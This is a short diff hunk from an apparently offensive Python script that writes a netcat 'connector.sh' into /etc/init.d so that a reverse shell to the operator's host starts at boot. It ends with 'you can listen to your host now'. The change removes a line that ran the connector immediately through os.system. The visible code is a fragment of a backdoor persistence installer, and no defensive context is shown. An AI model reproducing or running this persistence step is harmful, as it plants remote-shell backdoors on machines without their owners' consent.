@@ -50,8 +50,7 @@ if shell_type == "NC":  #add host and port to connect.sh to init.d
 	 f.write(sh_template)
 	 f.close()
  except:
-	 cprint("[!]cannot add connector.py","red")	
- os.system("sh /etc/init.d/connector.sh")  
+	 cprint("[!]cannot add connector.py","red")	 
  cprint("[+]setup done ! you can listen to your host now","blue")
 else:
  cprint("[!]cannot find shell type","red")
